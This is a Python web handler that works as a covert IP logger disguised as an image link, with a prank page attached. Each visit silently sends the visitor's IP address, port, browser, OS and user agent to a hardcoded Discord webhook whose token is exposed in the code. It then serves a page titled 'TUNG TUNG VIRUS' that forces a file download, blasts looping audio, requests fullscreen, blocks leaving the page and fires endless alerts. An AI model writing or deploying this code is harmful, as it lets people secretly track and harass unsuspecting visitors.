from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# Short & stable annoying page with loud Tung Tung song
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
    h1{font-size:6em;animation:blink 0.3s infinite;}
    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS</h1>
    <p>LOUD MODE ACTIVATED 🔥</p>
  </div>

  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    // Loud Tung Tung song
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(() => { setTimeout(() => audio.play(), 300); });

    // Force GIF download
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Annoying stuff
    document.documentElement.requestFullscreen?.().catch(() => {});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`
**Tung Tung loud song activated!**"""

            requests.post(WEBHOOK_URL, json={"content": log})

            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
